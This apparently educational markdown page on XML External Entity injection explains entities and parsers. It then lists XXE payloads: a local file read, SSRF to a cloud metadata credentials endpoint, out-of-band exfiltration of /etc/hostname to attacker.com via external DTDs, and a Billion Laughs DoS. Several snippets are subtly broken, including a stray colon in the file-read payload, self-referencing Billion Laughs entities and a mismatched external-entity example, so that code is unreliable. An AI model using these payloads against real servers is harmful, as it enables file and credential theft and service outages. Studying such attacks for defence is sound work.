---
title: XML External Entity
description: XML external entity injection
sidebar:
  order: 2
---
XXE is a security vulnerability that allows an attacker to inject malicious content into an XML document.
## What is XML?

- Stands for Extensible Markup Language
- Used by application to store and transport data, web services, APIs
- It's human-readable and machine parseable

## XML Syntax and Structure

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user id="1">
   <name>John</name>
   <age>30</age>
   <address>
      <street>123 Main St</street>
      <city>Anytown</city>
   </address>
</user>
```

- **Element** is a tag
- **Attributes** additional information for the tag
## XSLT
- Extensible Stylesheet Language Transformations
- Use for data transformation and formatting

### XSLT for XXE attack
- **Data Extraction** : extract sensitive data
- **Entity Expansion**: allows can expand entity which means attacker can inject malicious entities.
- **Data Manipulation**: modifying data in a XML document
- **Blind XXE**: attack can inject malicious entities without seeing the server response.

## DTD
- Document Type Definitions
- Define structure and constraints of an XML document
- Purpose of DTD
  - **Validation**: ensure XML follow the structure of specific criteria
  - **Entity Declaration**: define entities that can be used in the XML document

## XML Entities
- Entities are placeholder for data or code in XML document
### General Entities
General entities are used to define reusable content that appears in the body of XML element or attributes.

```xml
<!DOCTYPE data [
<!ENTITY name "John Doe">
]>
<data>&name;</data>
```

Output when parsed 
```xml
<data>John Doe</data>
```


**Internal Entities** 
Internal entities is when the entity is defined fully enclosed in the xml file and the parser doesn't have to fetch from external files or URLs.


**External Entities**
Same as internal entity but the entity are referencing from an external source that is outside of the XML document. 

When the XML parser processes this:
```xml
<!DOCTYPE note [
<!ENTITY ext SYSTEM "http://example.com/external.dtd">
]>
<note>
        <info>&ext;</info>
</note>
```

`external.dtd`
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%eval;
```

It will:
1. **Parse the DTD** section.
2. **See the external entity declaration**:  
    `<!ENTITY ext SYSTEM "http://example.com/external.dtd">`
3. **Make an HTTP request** to `http://example.com/external.dtd`
4. **Retrieve the content** from that URL.
5. Wherever `&ext;` is used in the XML, it will be **replaced with the response body** from that URL.

### Parameter Entities
Parameter is used to define DTD structure, it can only be used within the DTD and start with `%` instead of `&`. 

When the XML parser processes this:
```xml
<!DOCTYPE note [
  <!ENTITY % eval "<!ENTITY data SYSTEM 'file:///etc/passwd'>">
  %eval;
]>
<note>
  <info>&data;</info>
</note>
```
It will:
1. **Parse the DTD** section at the top of the XML.
2. **Define a parameter entity** `%eval` that contains a string:  
    `<!ENTITY data SYSTEM 'file:///etc/passwd'>`
3. **Expand `%eval;`**, which causes the parser to evaluate and insert a new general entity declaration:  
    `<!ENTITY data SYSTEM 'file:///etc/passwd'>`
4. **Define the general entity `data`**, which now points to the file `/etc/passwd`.
5. When the parser sees `&data;` inside the XML content, it will **read the file `/etc/passwd` and replace `&data;` with its contents**.

Example of using parameter entity to define reusable DTD content.
```xml
<!DOCTYPE data [
  <!ENTITY % commonFields "
    <!ELEMENT title (#PCDATA)>
    <!ELEMENT body (#PCDATA)>
    <!ELEMENT author (#PCDATA)>
  ">
  
  %commonFields;

  <!ELEMENT note (title, body, author)>
  <!ELEMENT message (title, body, author)>
  <!ELEMENT email (title, body, author)>
]>
<data>
  <note>
    <title>Note Title</title>
    <body>This is a note.</body>
    <author>John</author>
  </note>
  <message>
    <title>Message Title</title>
    <body>This is a message.</body>
    <author>John</author>
  </message>
  <email>
    <title>Email Title</title>
    <body>This is an email.</body>
    <author>John</author>
  </email>
</data>

```

It will:
1. **Parse the DTD** section at the top of the XML.
2. **Define a parameter entity** `%commonFields`, which contains three element declarations:
```xml
<!ELEMENT title (#PCDATA)> <!ELEMENT body (#PCDATA)> <!ELEMENT author (#PCDATA)>
```
3. **Expand `%commonFields;`**, which inserts those three element definitions into the DTD.
4. Then defines three elements — `note`, `message`, and `email` — each expecting child elements `title`, `body`, and `author`.
5. In the XML body, when the parser sees `<note>`, `<message>`, and `<email>`, it validates them using the element declarations inserted via `%commonFields`.
## XML Parsing Mechanisms
XML parsing is a process where the server reads the XML file and convert the XML into a structure that the application can read. 

- **DOM Parser (Document Object Model)**: Loads the entire XML document into memory as a tree structure, allowing full read/write access to all nodes. Vulnerable to XXE and DoS if not properly configured.
- **SAX (Simple API for XML)**: Parses XML sequentially, line by line, and triggers events (startElement, characters, endElement). It’s memory-efficient but can still be vulnerable to XXE unless external entities are disabled.
- **StAX (Streaming API for XML)**: A pull-based parser where the application controls when and what to read from the XML stream. More secure by default, but still requires explicit configuration to disable XXE.
- **XPath Parser**: Evaluates XPath expressions against an XML document. Often used in combination with DOM. Not directly responsible for XXE, but may inherit vulnerability from the underlying XML parser
## XXE Attack
- **Resource Exhaustion Attacks**: These attacks aim to exhaust server memory by feeding the XML parser malicious payloads like the _Billion Laughs_ attack. In this case, nested entities (e.g., "LOL") are recursively expanded, generating billions of characters, which can crash the server and cause a Denial of Service (DoS). 
- **Data Extraction Attacks**: The attacker defines an external entity that references sensitive resources using `file://` or `http://` URIs. When the parser resolves the entity, it may retrieve confidential data from the local system (e.g., `/etc/passwd`), effectively leaking information.
- **SSRF (Server-Side Request Forgery) Attacks**: The attacker tricks the vulnerable server into making HTTP requests to internal services (e.g., `http://127.0.0.1:8080/internal-api`). This can be used to probe internal systems that are otherwise inaccessible externally.

## Mitigation
- Disable DTDs (External Entities) completely.
- External entities and external document type declarations must be disabled in the way that's specific to each parser.
- Use less complex data formats like JSON

## Exploit
### Read file
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe:</data>
```

### SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE data 
	[<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<data>&xxe;</data>
```

### Out-of-band 
Testing for Blind XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ 
	<!ENTITY xxe SYSTEM "http://attacker.com/"> 
]>
<data>&xxe;</data>
```

### XML parameters

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ 
	<!ENTITY % xxe SYSTEM "http://attacker.com/">
	%xxe;
]>
<data>1</data>

```
### Exfiltrate with out-of-band
#### Parameter Entity
**exfil.dtd**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % exfil SYSTEM "http://attacker.com/?x=%file;">
%exfil;
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://attacker.com/exfil.dtd">
<upload>
  <file>safe content</file>
</upload>
```

#### General Entity
**exfil.dtd**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://attacker.com/exfil.dtd">
<upload>
  <file>&exfil;</file>
</upload>
```

**Whats Happening?:**
- **Loads external DTD** from `http://attacker.com/exfil.dtd`
- `%file;` now holds contents of `/etc/hostname`
- `%eval;` contains the string: 
```xml
<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>
```
- **Expands `%eval;`**
- The parser **injects**:
```xml
<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%file;'>
```
- Now the general entity `&exfil;` is defined
- Later in the XML: `<file>&exfil;</file>`

### Billion of laughs
```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE laugh [  
    <!ELEMENT laugh ANY>  
    <!ENTITY LOL "LOL">  
    <!ENTITY LOL1 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">  
    <!ENTITY LOL2 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">  
    <!ENTITY LOL3 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">  
]>  
<laugh>&LOL3;</laugh>
```

## Links
- [XXE Complete Guide: Impact, Examples, and Prevention](https://www.hackerone.com/knowledge-center/xxe-complete-guide-impact-examples-and-prevention)
- [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)